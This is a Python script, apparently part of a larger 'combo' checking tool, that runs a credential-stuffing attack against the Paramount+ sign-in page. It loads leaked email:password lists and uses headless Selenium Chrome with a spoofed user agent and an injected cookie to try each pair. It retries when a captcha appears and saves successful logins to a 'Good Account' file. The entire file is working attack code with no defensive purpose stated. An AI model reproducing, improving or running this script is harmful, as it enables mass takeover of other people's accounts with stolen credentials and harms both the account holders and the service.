import time

from combo_splitters.split_combos import ComboSplitter
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import ElementClickInterceptedException, NoSuchElementException
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.chrome.options import Options
from titles.paramount_title import title
from modules.connection_error import connection_error_try_block as ip_country
from pathlib import Path


def paramount_():
	title()
	file_directory = str(Path(__file__).parents[1])+'/combolists/paramount'
	plain_directory = str(Path(__file__).parents[1])
	ip_country()
	page = 'https://www.paramountplus.com/account/signin/'
	splitter = ComboSplitter(file_directory, "paramount")
	try:
		users, passwords = splitter.split_file()
	except TypeError:
		splitter.return_error()
		exit()
	index = 0
	browser_options = Options()
	browser_options.add_argument('--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36')
	browser_options.add_argument('--headless=new')
	while index < len(users):
		with open(plain_directory + '/accounts/paramount_acc', 'a') as account_results:
			try:
				print('\rTrying Combo {} out of {}'.format(index+1, len(users)),end='')
				browser = webdriver.Chrome(options=browser_options)
				browser.set_window_size(500, 700)
				browser.get(page)
				browser.add_cookie({'name': 'ovvuid', 'value': 'bb7470a9-4e85-4863-b551-8667ea62be6c'})
				browser.set_page_load_timeout(10)
				email_input_box = browser.find_element(By.XPATH, '//*[@id="email"]')
				password_input_box = browser.find_element(By.XPATH, '//*[@id="password"]')
				sign_in_button = browser.find_element(By.XPATH, '//*[@id="sign-in-form"]/div/div[3]/button')
				email_input_box.send_keys(users[index])
				password_input_box.send_keys(passwords[index])
				sign_in_button.click()
				time.sleep(5)
				if browser.find_elements(By.XPATH, '//*[@id="main-aa-container"]/section/div[2]/div[2]/div/div[1]'):
					print(' -- Error: Captcha. Iteration index not increased'.format(users[index], passwords[index]))
					continue
				if browser.find_elements(By.XPATH, '//*[@id="main-aa-container"]/section/div/div[1]/p'):
					invalid_email_text = browser.find_element(By.XPATH, '//*[@id="main-aa-container"]/section/div/div[1]/p').text
					if 'Invalid email and/or password' in str(invalid_email_text):
						print(' -- {}:{} ---> Invalid Credentials'.format(users[index],passwords[index]))
						index +=1
						continue
				if 'signin/' in str(browser.current_url):
					print(' -- {}:{} ---> Request Processing Error'.format(users[index],passwords[index]))
				if 'home' in str(browser.current_url):
					print(' -- {}:{} ---> Success!'.format(users[index],passwords[index]))
					account_results.write(' -- {}:{} ---> Good Account\n'.format(users[index],passwords[index]))
				if browser.find_elements(By.XPATH, '//*[@id="profile-container"]/div/div/div[1]/div[3]'):
					valid = browser.find_element(By.XPATH, '//*[@id="profile-container"]/div/div/div[1]/div[3]').text
					if "Who's Watching" in str(valid):
						print(' -- {}:{} ---> Success!'.format(users[index],passwords[index]))
						account_results.write(' -- {}:{} ---> Good Account\n'.format(users[index],passwords[index]))
				browser.close()
				index += 1
			except (ElementClickInterceptedException, NoSuchElementException):
				print(' -- Error: Intercepted')
				browser.close()
			except TimeoutException:
				print(' -- Timed out. Index not incremented.')
				browser.close()
			except Exception as e:
				print(e)
				break
